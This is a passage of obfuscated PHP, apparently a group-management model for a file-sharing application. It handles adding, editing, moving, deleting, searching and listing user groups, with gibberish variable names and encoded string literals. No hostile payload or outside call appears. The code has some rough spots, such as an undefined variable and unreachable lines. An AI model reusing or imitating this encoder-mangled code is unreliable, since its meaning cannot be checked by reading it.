$ƒ¥¬¢Æ = $this->max($äÚ­²›Ÿ[1998]); if (!$ƒ¥¬¢Æ) { $ƒ¥¬¢Æ = 0; } $ì¦¶¶â[$äÚ­²›Ÿ[1998]] = $ƒ¥¬¢Æ + 1; } if (!empty($„³å²»[$äÚ­²›Ÿ[1974]])) { $ì¦¶¶â[$äÚ­²›Ÿ[1974]] = $„³å²»[$äÚ­²›Ÿ[1974]]; } $Òºµôäì = $this->add($ì¦¶¶â); $this->setNamePinyin($Òºµôäì, $ì¦¶¶â[$äÚ­²›Ÿ[32]]); if (isset($„³å²»[$äÚ­²›Ÿ[2064]])) { $this->metaSet($Òºµôäì, array($äÚ­²›Ÿ[2064] => $„³å²»[$äÚ­²›Ÿ[2064]], $äÚ­²›Ÿ[2065] => $„³å²»[$äÚ­²›Ÿ[2065]])); unset($„³å²»[$äÚ­²›Ÿ[2064]]); unset($„³å²»[$äÚ­²›Ÿ[2065]]); } Model($äÚ­²›Ÿ[1420])->groupRootAdd($Òºµôäì); $this->_clearCache($„³å²»[$äÚ­²›Ÿ[192]]); return $Òºµôäì; } protected function groupEdit($€øÜÎ€, $şÌàÌ«Î) { $•¡ƒŞÂŠ =& $_SERVER[´È¥ö†ö]; $Ç‡â = $this->getInfoSimple($€øÜÎ€); if (!$Ç‡â) { return !1; } if (!empty($şÌàÌ«Î[$•¡ƒŞÂŠ[192]])) { $øó†û = $this->getInfoSimple($şÌàÌ«Î[$•¡ƒŞÂŠ[192]]); if (!$øó†û) { return !1; } if ($Ç‡â[$•¡ƒŞÂŠ[1974]] == $øó†û[$•¡ƒŞÂŠ[1974]]) { return !1; } if ($şÌàÌ«Î[$•¡ƒŞÂŠ[192]] != $Ç‡â[$•¡ƒŞÂŠ[192]]) { if ($øó†û[$•¡ƒŞÂŠ[595]] !== $Ç‡â[$•¡ƒŞÂŠ[595]] && strpos($øó†û[$•¡ƒŞÂŠ[595]], $Ç‡â[$•¡ƒŞÂŠ[595]] . $Ç‡â[$•¡ƒŞÂŠ[1974]] . $•¡ƒŞÂŠ[50]) === 0) { return !1; } $şÌàÌ«Î[$•¡ƒŞÂŠ[666]] = $øó†û[$•¡ƒŞÂŠ[595]] . $şÌàÌ«Î[$•¡ƒŞÂŠ[192]] . $•¡ƒŞÂŠ[50]; $this->_changeChildLevel($Ç‡â, $øó†û); $this->_clearCache($øó†û[$•¡ƒŞÂŠ[1974]]); $this->_clearCache($Ç‡â[$•¡ƒŞÂŠ[192]]); } } if (isset($şÌàÌ«Î[$•¡ƒŞÂŠ[32]])) { $this->setNamePinyin($€øÜÎ€, $şÌàÌ«Î[$•¡ƒŞÂŠ[32]]); } if (isset($şÌàÌ«Î[$•¡ƒŞÂŠ[2064]])) { $this->metaSet($€øÜÎ€, array($•¡ƒŞÂŠ[2064] => $şÌàÌ«Î[$•¡ƒŞÂŠ[2064]], $•¡ƒŞÂŠ[2065] => $şÌàÌ«Î[$•¡ƒŞÂŠ[2065]])); unset($şÌàÌ«Î[$•¡ƒŞÂŠ[2064]]); unset($şÌàÌ«Î[$•¡ƒŞÂŠ[2065]]); } $this->_clearChildrenCache($Ç‡â); return $this->where(array($•¡ƒŞÂŠ[2066] => $€øÜÎ€))->save($şÌàÌ«Î); } private function _clearChildrenCache($è¾ûëış) { $äçµÖ× =& $_SERVER[´È¥ö†ö]; $Û¢ÃŞñç = array($äçµÖ×[666] => array($äçµÖ×[626], $è¾ûëış[$äçµÖ×[595]] . $è¾ûëış[$äçµÖ×[1974]] . $äçµÖ×[627])); $äÔ²øÂ‘ = $this->field($äçµÖ×[1974])->where($Û¢ÃŞñç)->select(); foreach ($äÔ²øÂ‘ as $èÑø‡ôÏ) { $this->_clearCache($èÑø‡ôÏ[$äçµÖ×[1974]]); } } private function _clearCache($õ­Ò‘€ß) { $Ëó¾”…Ñ =& $_SERVER[´È¥ö†ö]; $this->cacheFunctionClear($Ëó¾”…Ñ[2060], $õ­Ò‘€ß); $this->cacheFunctionClear($Ëó¾”…Ñ[2061], $õ­Ò‘€ß); } private function _changeChildLevel($ÑÔ»›º, $•™ÓÇˆŒ, $É®”Ïò“ = false) { $ı¼ÄÙ¬± =& $_SERVER[´È¥ö†ö]; $³ı›î†í = $ÑÔ»›º[$ı¼ÄÙ¬±[595]] . $ÑÔ»›º[$ı¼ÄÙ¬±[1974]] . $ı¼ÄÙ¬±[50]; $÷ÄÔã¸™ = $•™ÓÇˆŒ[$ı¼ÄÙ¬±[595]] . $•™ÓÇˆŒ[$ı¼ÄÙ¬±[1974]] . $ı¼ÄÙ¬±[50] . $ÑÔ»›º[$ı¼ÄÙ¬±[1974]] . $ı¼ÄÙ¬±[50]; if ($É®”Ïò“) { $÷ÄÔã¸™ = $•™ÓÇˆŒ[$ı¼ÄÙ¬±[595]] . $•™ÓÇˆŒ[$ı¼ÄÙ¬±[1974]] . $ı¼ÄÙ¬±[50]; } $‚ÄÜ·¦ù = array($ı¼ÄÙ¬±[666] => array($ı¼ÄÙ¬±[626], $ÑÔ»›º[$ı¼ÄÙ¬±[595]] . $ÑÔ»›º[$ı¼ÄÙ¬±[1974]] . $ı¼ÄÙ¬±[627])); $Ñ‰…ŞòÒ = array($ı¼ÄÙ¬±[666] => array($ı¼ÄÙ¬±[675], "\162\145\160\154\x61\143\145\x28\160\x61\162\145\x6e\164\114\145\x76\x65\154\54\x27{$³ı›î†í}\x27\54\x27{$÷ÄÔã¸™}\x27\51")); $this->_clearChildrenCache($ÑÔ»›º); $this->where($‚ÄÜ·¦ù)->data($Ñ‰…ŞòÒ)->save(); } public function setNamePinyin($ÈØŒ÷Ãó, $ıÄÔ´¯² = false) { $ÏƒÌ…ºÀ =& $_SERVER[´È¥ö†ö]; if (!$ıÄÔ´¯²) { $ÄüÇ«›‘ = $this->getInfoSimple($ÈØŒ÷Ãó); $ıÄÔ´¯² = $ÄüÇ«›‘[$ÏƒÌ…ºÀ[32]]; } if (!Input::check($ıÄÔ´¯², $ÏƒÌ…ºÀ[669])) { $this->metaSet($ÈØŒ÷Ãó, $ÏƒÌ…ºÀ[549], null); $this->metaSet($ÈØŒ÷Ãó, $ÏƒÌ…ºÀ[548], null); return; } $ÓšÅÈÏ÷ = array($ÏƒÌ…ºÀ[549] => str_replace($ÏƒÌ…ºÀ[53], $ÏƒÌ…ºÀ[12], Pinyin::get($ıÄÔ´¯²)), $ÏƒÌ…ºÀ[548] => Pinyin::get($ıÄÔ´¯², $ÏƒÌ…ºÀ[670])); $this->metaSet($ÈØŒ÷Ãó, $ÓšÅÈÏ÷); } protected function metaSet($©À˜òá, $°İ¯“¤Ô = null, $µ®úË”î = null) { $this->_clearCache($©À˜òá); return parent::metaSet($©À˜òá, $°İ¯“¤Ô, $µ®úË”î); } protected function groupStatus($îÍÛ÷ˆª, $ÈÂ¼û¢‚) { $˜íÀë²Ç =& $_SERVER[´È¥ö†ö]; $ëØ¸éÏ = $this->getInfoSimple($îÍÛ÷ˆª); if (!$ëØ¸éÏ) { return !1; } $this->_clearCache($îÍÛ÷ˆª); return $this->metaSet($îÍÛ÷ˆª, $˜íÀë²Ç[826], $ÈÂ¼û¢‚); if ($ÈÂ¼û¢‚ == $˜íÀë²Ç[91]) { $Ë¿ù§Œ = $this->parentLevelArray($ëØ¸éÏ[$˜íÀë²Ç[595]]); } else { } $Ë¿ù§Œ[] = $ëØ¸éÏ[$˜íÀë²Ç[1974]]; $Ğ¼ùÆŠ¬ = array(); foreach ($Ë¿ù§Œ as $îÍÛ÷ˆª) { $Ğ¼ùÆŠ¬[] = array($˜íÀë²Ç[1974] => $îÍÛ÷ˆª, $˜íÀë²Ç[97] => $˜íÀë²Ç[826], $˜íÀë²Ç[461] => $ÈÂ¼û¢‚); $this->_clearCache($îÍÛ÷ˆª); } return Model($˜íÀë²Ç[2067])->addAll($Ğ¼ùÆŠ¬, array(), !0); } protected function groupRemove($ïÉµèé§, $‹ó’¶ Ò = false) { $ø»¯³á =& $_SERVER[´È¥ö†ö]; $å±àî²Ä = array($ø»¯³á[1974] => $ïÉµèé§); $€×ƒÍÄ¾ = $this->where($å±àî²Ä)->find(); if (!$€×ƒÍÄ¾ || $€×ƒÍÄ¾[$ø»¯³á[192]] == 0) { return !1; } if (!$‹ó’¶ Ò) { $©“¶££û = $this->getInfoSimple($€×ƒÍÄ¾[$ø»¯³á[192]]); $this->_changeChildLevel($€×ƒÍÄ¾, $©“¶££û, !0); $this->where(array($ø»¯³á[192] => $ïÉµèé§))->save(array($ø»¯³á[192] => $€×ƒÍÄ¾[$ø»¯³á[192]])); $this->_clearCache($©“¶££û[$ø»¯³á[1974]]); } Model($ø»¯³á[2067])->where($å±àî²Ä)->delete(); Model($ø»¯³á[2068])->where($å±àî²Ä)->delete(); Model($ø»¯³á[901])->groupRootRemove($ïÉµèé§); $this->_clearCache($€×ƒÍÄ¾[$ø»¯³á[192]]); return $this->where($å±àî²Ä)->delete(); } protected function groupSort($•ğêßùØ) { $çü÷áÊŒ =& $_SERVER[´È¥ö†ö]; $Â®‘‘Œ = array(); foreach ($•ğêßùØ as $ç€” ƒå => $ÜúïŒ½Ë) { $Â®‘‘Œ[] = array($çü÷áÊŒ[1974], $ÜúïŒ½Ë, $çü÷áÊŒ[1998], $ç€” ƒå + 1); } $this->saveAll($Â®‘‘Œ); } public function listData() { $‡Ì•ú£Í = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡Ì•ú£Í[$_SERVER[´È¥ö†ö][456]]); return $‡Ì•ú£Í; } private function _makeOrder($˜Òöü™ = '') { $ú‡ƒ»óı =& $_SERVER[´È¥ö†ö]; $ˆ®°Õù = array($ú‡ƒ»óı[1974], $ú‡ƒ»óı[32], $ú‡ƒ»óı[1962], $ú‡ƒ»óı[233]); $£¥Ú÷²¢ = array($ú‡ƒ»óı[534] => $ú‡ƒ»óı[535], $ú‡ƒ»óı[536] => $ú‡ƒ»óı[537]); $ûöò‡Ùœ = Input::get($ú‡ƒ»óı[541], $ú‡ƒ»óı[7], $ú‡ƒ»óı[1978], $ˆ®°Õù); $Ú„µ¬Ä§ = Input::get($ú‡ƒ»óı[542], $ú‡ƒ»óı[7], $ú‡ƒ»óı[2069], array($ú‡ƒ»óı[2069], $ú‡ƒ»óı[536])); $Ú„µ¬Ä§ = $£¥Ú÷²¢[$Ú„µ¬Ä§]; $˜Òöü™ = $˜Òöü™ . "{$ûöò‡Ùœ}\x20{$Ú„µ¬Ä§}\54\x20\147\162\157\x75\160\111\104\x20\141\x73\143"; return $this->order($˜Òöü™); } public function listChild($¥”ÇÜ¥²) { $Ø¡•Ì‹ =& $_SERVER[´È¥ö†ö]; $«“¡şÛ« = $this->where(array($Ø¡•Ì‹[192] => $¥”ÇÜ¥²))->_makeOrder()->selectPage(200); $this->_listDataApply($«“¡şÛ«[$Ø¡•Ì‹[456]]); return $«“¡şÛ«; } public function listChildIds($ˆğ´è¨È) { $ÎÍ¸”¹Â =& $_SERVER[´È¥ö†ö]; if (is_string($‰©ı¹)) { $ˆğ´è¨È = explode($ÎÍ¸”¹Â[50], $ˆğ´è¨È); } $–‰æó˜ğ = $this->where(array($ÎÍ¸”¹Â[1974] => array($ÎÍ¸”¹Â[7], $ˆğ´è¨È)))->field($ÎÍ¸”¹Â[2070])->select(); if (!$–‰æó˜ğ) { return !1; } $…Êï›çç = array(); foreach ($–‰æó˜ğ as $»ë ¿) { $…Êï›çç[] = "\163\x65\x6c\x65\143\164\40\x67\162\x6f\165\160\x49\x44\40\146\162\157\x6d\40\x60\147\x72\x6f\165\x70\x60\40\x77\150\x65\162\145\40\x70\x61\162\145\x6e\164\114\145\x76\145\154\40\x6c\x69\153\x65\40\47{$»ë ¿[$ÎÍ¸”¹Â[595]]}{$»ë ¿[$ÎÍ¸”¹Â[1974]]}\54\x25\x27"; } $…Êï›çç = implode($ÎÍ¸”¹Â[2071], $…Êï›çç); $–‰æó˜ğ = $this->query($…Êï›çç); if (!$–‰æó˜ğ) { return array(); } $ˆğ´è¨È = array_to_keyvalue($–‰æó˜ğ, $ÎÍ¸”¹Â[12], $ÎÍ¸”¹Â[1974]); return array_unique($ˆğ´è¨È); } public function listByID($ËÓ¼ ô¿) { $½ô®‹å =& $_SERVER[´È¥ö†ö]; if (!$ËÓ¼ ô¿) { return array(); } $‰ÄöšÔ = array($½ô®‹å[1974] => array($½ô®‹å[7], $ËÓ¼ ô¿)); $œÕƒİ™ = $this->where($‰ÄöšÔ)->select(); $œÕƒİ™ = array_sort_keep($œÕƒİ™, $½ô®‹å[1974], $ËÓ¼ ô¿); $this->_listDataApply($œÕƒİ™); return $œÕƒİ™; } public function listSearch($á„¸Ú…Ò) { $äÀÅĞêÜ =& $_SERVER[´È¥ö†ö]; $Ö†ìº¦Ú = trim($á„¸Ú…Ò[$äÀÅĞêÜ[2072]]); $“©…Áçƒ = explode($äÀÅĞêÜ[53], $Ö†ìº¦Ú); if (!$Ö†ìº¦Ú || count($“©…Áçƒ) == 1) { return $this->listSearchNow($á„¸Ú…Ò); } $›»±Æ£‡ = array($äÀÅĞêÜ[456] => array()); foreach ($“©…Áçƒ as $Îè²¥—×) { if (!trim($Îè²¥—×)) { continue; } $á„¸Ú…Ò[$äÀÅĞêÜ[2072]] = $Îè²¥—×; $Û£ç–— = $this->listSearchNow($á„¸Ú…Ò); $›»±Æ£‡[$äÀÅĞêÜ[456]] = array_merge($›»±Æ£‡[$äÀÅĞêÜ[456]], $Û£ç–—[$äÀÅĞêÜ[456]]); } $›»±Æ£‡[$äÀÅĞêÜ[456]] = array_unique_by_key($›»±Æ£‡[$äÀÅĞêÜ[456]], $äÀÅĞêÜ[1974]); $›»±Æ£‡[$äÀÅĞêÜ[453]] = array($äÀÅĞêÜ[454] => count($›»±Æ£‡[$äÀÅĞêÜ[456]]), $äÀÅĞêÜ[450] => 20, $äÀÅĞêÜ[439] => 1, $äÀÅĞêÜ[455] => 1); return $›»±Æ£‡; } public function listSearchNow($ó›¦²Åù) { $ï€”ÁÁÓ =& $_SERVER[´È¥ö†ö]; $‡øÃ½‡ë = trim($ó›¦²Åù[$ï€”ÁÁÓ[2072]]); $µË—ƒ¶© = isset($ó›¦²Åù[$ï€”ÁÁÓ[2073]]) ? $ó›¦²Åù[$ï€”ÁÁÓ[2073]] : !1; if (!trim($‡øÃ½‡ë)) { return !1; } $‡øÃ½‡ë = str_replace($ï€”ÁÁÓ[2074], $ï€”ÁÁÓ[2075], $‡øÃ½‡ë); $«Ü„ğœŞ = array($ï€”ÁÁÓ[1974] => array($ï€”ÁÁÓ[470], "{$‡øÃ½‡ë}\45"), $ï€”ÁÁÓ[32] => array($ï€”ÁÁÓ[470], "\x25{$‡øÃ½‡ë}\45"), $ï€”ÁÁÓ[1076] => $ï€”ÁÁÓ[2076]); if ($µË—ƒ¶©) { $àñ«ªÉ = $this->getInfoSimple($µË—ƒ¶©); $Á¿¶Ø” = $àñ«ªÉ[$ï€”ÁÁÓ[595]] . $µË—ƒ¶© . $ï€”ÁÁÓ[627]; $«Ü„ğœŞ = array($«Ü„ğœŞ, array($ï€”ÁÁÓ[595] => array($ï€”ÁÁÓ[470], $Á¿¶Ø”))); } $«Ü„ğœŞ = $this->parseWhereLike($«Ü„ğœŞ); $Ö¬÷­‹® = $this->_makeOrder()->where($«Ü„ğœŞ)->selectPage(20); $Ö¬÷­‹® = $Ö¬÷­‹® ? $Ö¬÷­‹® : array($ï€”ÁÁÓ[456] => array(), $ï€”ÁÁÓ[453] => array()); if (!$Ö¬÷­‹® || count($Ö¬÷­‹®[$ï€”ÁÁÓ[456]]) < 5 && Input::check($‡øÃ½‡ë, $ï€”ÁÁÓ[404])) { $ìŸÍÙî¢ = $this->groupChildrenAll($µË—ƒ¶©); $æÍ«²ÎÛ = $this->_searchFromMeta($ï€”ÁÁÓ[548], $‡øÃ½‡ë, 10, $ìŸÍÙî¢); $‡§©øì = $this->_searchFromMeta($ï€”ÁÁÓ[549], $‡øÃ½‡ë, 10, $ìŸÍÙî¢); $ŠËî›—´ = array_merge($æÍ«²ÎÛ, $‡§©øì, $Ö¬÷­‹®[$ï€”ÁÁÓ[456]]); $Ö¬÷­‹®[$ï€”ÁÁÓ[456]] = array_unique_by_key($ŠËî›—´, $ï€”ÁÁÓ[1974]); $Ö¬÷­‹®[$ï€”ÁÁÓ[453]][$ï€”ÁÁÓ[454]] = count($Ö¬÷­‹®[$ï€”ÁÁÓ[456]]); $Ö¬÷­‹®[$ï€”ÁÁÓ[453]][$ï€”ÁÁÓ[455]] = ceil($Ö¬÷­‹®[$ï€”ÁÁÓ[453]][$ï€”ÁÁÓ[454]] / $Ö¬÷­‹®[$ï€”ÁÁÓ[453]][$ï€”ÁÁÓ[450]]); } $this->_listDataApply($Ö¬÷­‹®[$ï€”ÁÁÓ[456]]); return $Ö¬÷­‹®; } protected function groupChildrenAll($ŠĞÂ‹€†) { $œ‚æ¾˜» =& $_SERVER[´È¥ö†ö]; if (!$ŠĞÂ‹€†) { return !1; } if (!is_array($ŠĞÂ‹€†)) { $ŠĞÂ‹€† = array($ŠĞÂ‹€†); } $™ß¯‚ø = $ŠĞÂ‹€†; foreach ($ŠĞÂ‹€† as $‰ÜéÂ¢è) { $ŠáÏè×œ = $this->getInfoSimple($‰ÜéÂ¢è); $¤³ä½¼º = array($œ‚æ¾˜»[595] => array($œ‚æ¾˜»[470], $ŠáÏè×œ[$œ‚æ¾˜»[595]] . $‰ÜéÂ¢è . $œ‚æ¾˜»[627])); $ºÄ‹•ıç = $this->field($œ‚æ¾˜»[1974])->where($¤³ä½¼º)->select(); $™ß¯‚ø = array_merge($™ß¯‚ø, array_to_keyvalue($ºÄ‹•ıç, $œ‚æ¾˜»[12], $œ‚æ¾˜»[1974])); } return array_unique($™ß¯‚ø); } private function _searchFromMeta($Ãªá›, $£«œ†’, $¡²Î¨ÛÖ, $ø­ª•Æ‡) { $§»‰Îë‡ =& $_SERVER[´È¥ö†ö]; $£«œ†’ = strtolower($£«œ†’); $„ˆûá³® = array($§»‰Îë‡[97] => $Ãªá›, $§»‰Îë‡[461] => array($§»‰Îë‡[470], "\45{$£«œ†’}\x25")); $„ˆûá³® = $this->parseWhereLike($„ˆûá³®); if ($ø­ª•Æ‡) { $„ˆûá³®[$§»‰Îë‡[1974]] = array($§»‰Îë‡[7], $ø­ª•Æ‡); } $ËİÄ™ = Model($§»‰Îë‡[2077])->where($„ˆûá³®)->limit($¡²Î¨ÛÖ)->select(); if (!$ËİÄ™) { return array(); } $ËİÄ™ = array_to_keyvalue($ËİÄ™, $§»‰Îë‡[12], $§»‰Îë‡[1974]); $ğ°ÕĞ¿¼ = $this->where(array($§»‰Îë‡[2066] => array($§»‰Îë‡[7], $ËİÄ™)))->select(); if (!$ğ°ÕĞ¿¼) { return array(); } return $ğ°ÕĞ¿¼; } protected function _listDataApplyItem($ÃÛÓ×™) { $øˆÑˆÒ = array($ÃÛÓ×™); $this->_listDataApply($øˆÑˆÒ); return $øˆÑˆÒ[0]; } protected function _listDataApply(&$”üçâ¾Æ) { $Ñİ»Ëƒ³ =& $_SERVER[´È¥ö†ö]; if (!$”üçâ¾Æ) { return; } $àÜİœÊÇ = array_to_keyvalue($”üçâ¾Æ, $Ñİ»Ëƒ³[12], $Ñİ»Ëƒ³[1974]); $this->_listAppendChildren($”üçâ¾Æ); $this->_listAppendChildrenMember($”üçâ¾Æ); $this->_listAppendMeta($”üçâ¾Æ, $àÜİœÊÇ); $this->_listAppendParent($”üçâ¾Æ); $this->_listAppendSourceRoot($”üçâ¾Æ, $àÜİœÊÇ); } private function _listAppendChildren(&$­Ô›ğ) { $€ñòÀÇ€ =& $_SERVER[´È¥ö†ö]; $Ù»Òé‚ğ = array_to_keyvalue($­Ô›ğ, $€ñòÀÇ€[12], $€ñòÀÇ€[1974]); $ğã‚×Ø­ = array($€ñòÀÇ€[192] => array($€ñòÀÇ€[7], $Ù»Òé‚ğ)); $“ıİ¿€× = array($€ñòÀÇ€[192], $€ñòÀÇ€[2078] => $€ñòÀÇ€[576]); $ı’°è = $this->field($“ıİ¿€×)->where($ğã‚×Ø­)->group($€ñòÀÇ€[192])->select(); $úßàïÑ¬ = array_to_keyvalue($ı’°è, $€ñòÀÇ€[192], $€ñòÀÇ€[576]); foreach ($­Ô›ğ as &$Üûì‡§š) { $‰¿û¹íÈ = $Üûì‡§š[$€ñòÀÇ€[1974]]; $Üûì‡§š[$€ñòÀÇ€[2079]] = isset($úßàïÑ¬[$‰¿û¹íÈ]) ? intval($úßàïÑ¬[$‰¿û¹íÈ]) : !1; } unset($Üûì‡§š); } private function _listAppendChildrenMember(&$åÂäÒÛ) { $’¡áôùõ =& $_SERVER[´È¥ö†ö]; $ŠººÔéº = array_to_keyvalue($åÂäÒÛ, $’¡áôùõ[12], $’¡áôùõ[1974]); $äß±ÛÀ‰ = array($’¡áôùõ[1974] => array($’¡áôùõ[7], $ŠººÔéº)); $´“ê¤Ä“ = array($’¡áôùõ[1974], $’¡áôùõ[2078] => $’¡áôùõ[576]); $ÕŞè‡ş = Model($’¡áôùõ[2068])->field($´“ê¤Ä“)->where($äß±ÛÀ‰)->group($’¡áôùõ[1974])->select(); $¡»†àÑ = array_to_keyvalue($ÕŞè‡ş, $’¡áôùõ[1974], $’¡áôùõ[576]); foreach ($åÂäÒÛ as &$µ×¡¨”ã) { $—ĞÀş¹ = $µ×¡¨”ã[$’¡áôùõ[1974]]; $µ×¡¨”ã[$’¡áôùõ[2080]] = isset($¡»†àÑ[$—ĞÀş¹]) ? intval($¡»†àÑ[$—ĞÀş¹]) : !1; } unset($µ×¡¨”ã); } private function _listAppendMeta(&$ïàù´’·, $ ›Šìª¯) { $ªõÚó¶ß =& $_SERVER[´È¥ö†ö]; $¦ËÃëÏº = array($ªõÚó¶ß[1974] => array($ªõÚó¶ß[7], $ ›Šìª¯)); $¢™ô¯‘ = Model($ªõÚó¶ß[2067])->where($¦ËÃëÏº)->select(); $¢™ô¯‘ = array_to_keyvalue_group($¢™ô¯‘, $ªõÚó¶ß[1974]); foreach ($¢™ô¯‘ as &$º÷¬¿Ü¶) { $º÷¬¿Ü¶ = array_to_keyvalue($º÷¬¿Ü¶, $ªõÚó¶ß[97], $ªõÚó¶ß[461]); } unset($º÷¬¿Ü¶); foreach ($ïàù´’· as &$µ«®şÆ) { $µ«®şÆ[$ªõÚó¶ß[550]] = array(); if (isset($¢™ô¯‘[$µ«®şÆ[$ªõÚó¶ß[1974]]])) { $µ«®şÆ[$ªõÚó¶ß[550]] = $¢™ô¯‘[$µ«®şÆ[$ªõÚó¶ß[1974]]]; } } unset($µ«®şÆ); } protected function parentLevelArray($×§€ùé‡) { $ÈÚƒÖŞ =& $_SERVER[´È¥ö†ö]; $×§€ùé‡ = explode($ÈÚƒÖŞ[50], trim($×§€ùé‡, $ÈÚƒÖŞ[50])); $×§€ùé‡ = array_remove_value($×§€ùé‡, $ÈÚƒÖŞ[230]); return $×§€ùé‡; } protected function parentInGroup($¢™Ú†Ñ«, $øÇş†Ç) { $êÓááŸö =& $_SERVER[´È¥ö†ö]; $®œ¿å×í = $this->getInfoSimple($¢™Ú†Ñ«); if (!$®œ¿å×í) { return !0; } $šşÙªúÊ = $this->parentLevelArray($®œ¿å×í[$êÓááŸö[595]]); $šşÙªúÊ[] = $¢™Ú†Ñ«; foreach ($šşÙªúÊ as $¢™Ú†Ñ«) { if (in_array($¢™Ú†Ñ« . $êÓááŸö[12], $øÇş†Ç)) { return !0; } } return !1; } private function _listAppendParent(&$Ó¯ñò¹ø) { $ŞáäßÈÜ =& $_SERVER[´È¥ö†ö]; $¢ë³üçø = array(); foreach ($Ó¯ñò¹ø as &$†¿Ù’úü) { $¢ë³üçø[$†¿Ù’úü[$ŞáäßÈÜ[1974]]] = $†¿Ù’úü[$ŞáäßÈÜ[32]]; $“¥«ÅÇ = $this->parentLevelArray($†¿Ù’úü[$ŞáäßÈÜ[595]]); foreach ($“¥«ÅÇ as $¥¡ƒ´öÄ) { if (!isset($¢ë³üçø[$¥¡ƒ´öÄ])) { $¢ë³üçø[$¥¡ƒ´öÄ] = 0; } } } unset($†¿Ù’úü); foreach ($¢ë³üçø as $ñáÏë¡Š => $û¶Œ°ÈĞ) { if ($û¶Œ°ÈĞ) { continue; } $«Ó©œ†Æ = $this->getInfoSimple($ñáÏë¡Š); $¢ë³üçø[$ñáÏë¡Š] = $«Ó©œ†Æ[$ŞáäßÈÜ[32]]; } $”È¾Ïæ“ = $GLOBALS[$ŞáäßÈÜ[6]][$ŞáäßÈÜ[92]][$ŞáäßÈÜ[2081]]; if (KodUser::isRoot()) { $”È¾Ïæ“ = !1; } foreach ($Ó¯ñò¹ø as &$†¿Ù’úü) { $“¥«ÅÇ = $this->parentLevelArray($†¿Ù’úü[$ŞáäßÈÜ[595]]); $àˆãÂòÀ = $ŞáäßÈÜ[12]; foreach ($“¥«ÅÇ as $ñáÏë¡Š => $¥¡ƒ´öÄ) { if ($”È¾Ïæ“ && $ñáÏë¡Š == 0) { continue; } $àˆãÂòÀ .= $¢ë³üçø[$¥¡ƒ´öÄ] . $ŞáäßÈÜ[8]; } if ($“¥«ÅÇ) { $àˆãÂòÀ .= $†¿Ù’úü[$ŞáäßÈÜ[32]]; } $†¿Ù’úü[$ŞáäßÈÜ[600]] = str_replace($ŞáäßÈÜ[256], $ŞáäßÈÜ[8], $àˆãÂòÀ); } unset($†¿Ù’úü); } private function _listAppendSourceRoot(&$­øŒ–Î­, $½ö¥ËÑ‘) { $š…ÁÀ­Ï =& $_SERVER[´È¥ö†ö]; $ØÔÒ€Éó = Model($š…ÁÀ­Ï[901])->listSourceRoot(SourceModel::TYPE_GROUP, $½ö¥ËÑ‘); $ØÔÒ€Éó = array_to_keyvalue($ØÔÒ€Éó, $š…ÁÀ­Ï[580]); $ØÔÒ€Éó = array_remove_key($ØÔÒ€Éó, $š…ÁÀ­Ï[580]); foreach ($­øŒ–Î­ as &$„‚‡÷ã­) { $„‚‡÷ã­[$š…ÁÀ­Ï[90]] = $ØÔÒ€Éó[$„‚‡÷ã­[$š…ÁÀ­Ï[1974]]] ? $ØÔÒ€Éó[$„‚‡÷ã­[$š…ÁÀ­Ï[1974]]] : array(); } unset($„‚‡÷ã­); } protected function groupMerge($œ‰‘Å‘«) { $œ‰‘Å‘« = array_values(array_unique($œ‰‘Å‘«)); $†œšÇÚÖ = array(); for ($–ØÔı¿Ú = 0; $–ØÔı¿Ú < count($œ‰‘Å‘«); $–ØÔı¿Ú++) { $¾§ÙôÑ = !1; for ($ÍÔæèè = 0; $ÍÔæèè < count($œ‰‘Å‘«); $ÍÔæèè++) { if ($–ØÔı¿Ú == $ÍÔæèè) { continue; } if ($this->isParentOf($œ‰‘Å‘«[$ÍÔæèè], $œ‰‘Å‘«[$–ØÔı¿Ú])) { $¾§ÙôÑ = !0; break; } } if (!$¾§ÙôÑ) { $†œšÇÚÖ[] = $œ‰‘Å‘«[$–ØÔı¿Ú]; } } return $†œšÇÚÖ; } protected function isParentOf($€­ÑäŸø, $ğÊ˜îØ–) { $å°É¸­É =& $_SERVER[´È¥ö†ö]; if (!$€­ÑäŸø || !$ğÊ˜îØ– || $€­ÑäŸø == $ğÊ˜îØ–) { return !1; } $ñæ¯‚Ô¾ = $this->getInfoSimple($€­ÑäŸø); $Ô—Ñ•Óó = $this->getInfoSimple($ğÊ˜îØ–); $ü·µ‘ÑÉ = $ñæ¯‚Ô¾[$å°É¸­É[595]] . $€­ÑäŸø . $å°É¸­É[50]; if (substr($Ô—Ñ•Óó[$å°É¸­É[595]], 0, strlen($ü·µ‘ÑÉ)) == $ü·µ‘ÑÉ) { return !0; } return !1; } public function groupShowRoot($¾¸ÓÓö¡, $Œ¤©ïÌ = false) { $ˆĞ”Õø =& $_SERVER[´È¥ö†ö]; $›ŸĞöóƒ = $this->getInfo($¾¸ÓÓö¡); if (!$›ŸĞöóƒ) { return array(); } $§ø¸Œ‚÷ = $this->parentLevelArray($›ŸĞöóƒ[$ˆĞ”Õø[595]]); $¶‚†åéÛ = array($¾¸ÓÓö¡); if (count($§ø¸Œ‚÷) == 0) { return $¶‚†åéÛ; } if ($Œ¤©ïÌ && count($§ø¸Œ‚÷) == 1) { return $¶‚†åéÛ; } if (!$›ŸĞöóƒ[$ˆĞ”Õø[550]] || !isset($›ŸĞöóƒ[$ˆĞ”Õø[550]][$ˆĞ”Õø[2064]]) || $›ŸĞöóƒ[$ˆĞ”Õø[550]][$ˆĞ”Õø[2064]] == $ˆĞ”Õø[852]) { return $this->groupShowRoot($§ø¸Œ‚÷[count($§ø¸Œ‚÷) - 1], $Œ¤©ïÌ); } if ($›ŸĞöóƒ[$ˆĞ”Õø[550]][$ˆĞ”Õø[2064]] == $ˆĞ”Õø[443]) { $ª±Ó†¸‡ = explode($ˆĞ”Õø[50], $›ŸĞöóƒ[$ˆĞ”Õø[550]][$ˆĞ”Õø[2065]]); if ($ª±Ó†¸‡) { $¶‚†åéÛ = array_merge($¶‚†åéÛ, $ª±Ó†¸‡); } } return $¶‚†åéÛ; } protected function resetParentLevel() { $½—ù†¸Ò =& $_SERVER[´È¥ö†ö]; $šñúÁ¥ = $½—ù†¸Ò[1974]; $½†­†æ = $this->select(); $½†­†æ = array_to_keyvalue($½†­†æ, $šñúÁ¥); foreach ($½†­†æ as $§¸Æøé¬) { $è£Çøıú = $§¸Æøé¬; $şôùÎë = array(); while ($è£Çøıú[$½—ù†¸Ò[192]] != 0) { $şôùÎë[] = $è£Çøıú[$½—ù†¸Ò[192]]; $è£Çøıú = $½†­†æ[$è£Çøıú[$½—ù†¸Ò[192]]]; } $şôùÎë[] = 0; $şôùÎë = $½—ù†¸Ò[50] . implode($½—ù†¸Ò[50], 